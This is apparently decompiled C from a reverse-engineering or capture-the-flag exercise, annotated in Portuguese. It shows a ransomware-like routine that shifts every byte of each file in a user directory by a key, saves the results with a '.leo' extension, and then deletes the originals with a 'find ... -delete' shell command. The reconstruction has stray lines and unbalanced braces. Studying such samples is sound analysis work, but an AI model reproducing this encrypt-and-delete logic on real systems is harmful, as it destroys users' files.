{
  int iVar1;
  int iVar2;
  char *__name;
  undefined8 uVar3;
  DIR *__dirp;
  int *piVar4;
  FILE *__stream;
  FILE *__stream_00;
  dirent *pdVar5;
  long in_FS_OFFSET;
  char local_418 [512];
  char local_218 [520];
  long local_10; //canario
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);          // canario
  __name = getenv("USER");
  if (param_1 < 2) {                                  // forma como deve ser chamado
    printf("usage: ./%s <argument>",*param_2);
    uVar3 = 1;
  }
  else {
    iVar1 = atoi((char *)param_2[1]);   //tmp/key
    __dirp = opendir(__name);
        // enquanto tiver proximo diretorio, arquivo no caso
      while (pdVar5 = readdir(__dirp), pdVar5 != (dirent *)0x0) {
        iVar2 = strcmp(pdVar5->d_name,".");
        // readdir retorna primeiro o . e  .. . strcmp = 0 se forem iguais, ou seja,
        // só entra no if se nao for o . e o  .. 
        if ((iVar2 != 0) && (iVar2 = strcmp(pdVar5->d_name,".."), iVar2 != 0)) {
          sprintf(local_418,"%s/%s",__name,pdVar5->d_name);
        //   local_418  == pasta/file
          __stream = fopen(local_418,"rw");

          // adiciona .leo antes
          sprintf(local_218,"%s.leo",local_418);
          __stream_00 = fopen(local_218,"w");
        //
          while( true ) {
            iVar2 = fgetc(__stream);
            if ((char)iVar2 == -1) break; // eof
            int fputc(int char, FILE *pointer)
            // ivar1 /tmp/key
            // int fputc(int char, FILE *pointer)
            fputc((char)iVar2 + iVar1,__stream_00);
          }
          fclose(__stream_00);
          fclose(__stream);
        }
      }
      system("find $USER -type f ! -name \'*.leo\' -delete");
      uVar3 = 0;
    }
  }
  // canario
  LAB_001014b3:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}